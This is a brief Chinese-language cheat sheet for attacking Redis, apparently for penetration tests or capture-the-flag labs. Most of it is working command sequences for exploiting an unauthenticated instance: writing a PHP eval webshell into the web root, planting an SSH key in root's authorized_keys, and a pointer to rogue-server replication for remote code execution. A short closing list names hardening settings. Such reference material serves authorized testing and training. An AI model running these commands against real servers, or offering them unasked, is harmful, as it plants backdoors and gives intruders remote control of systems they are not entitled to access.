# Redis

## 连接与信息

```bash
redis-cli -h 10.10.10.20 -p 6379
```

```text
INFO
CONFIG GET dir
CONFIG GET dbfilename
SELECT 0
KEYS *
GET flag
```

## 未授权利用

### 写 Webshell

```text
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET webshell "<?php @eval($_POST['cmd']);?>"
SAVE
```

### 写 SSH 公钥

```text
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET key "ssh-rsa AAAA..."
SAVE
```

### 主从复制 RCE

- 使用 `redis-rogue-server` 或 MSF 模块。
- 需要目标 Redis 可以与攻击机通信。
- 成功后可加载恶意模块执行命令。

## 排查要点

- 默认端口：`6379`。
- 常见有 16 个数据库：`SELECT 0` 到 `SELECT 15`。
- 注意 `protected-mode`、`requirepass`、绑定地址和危险命令重命名。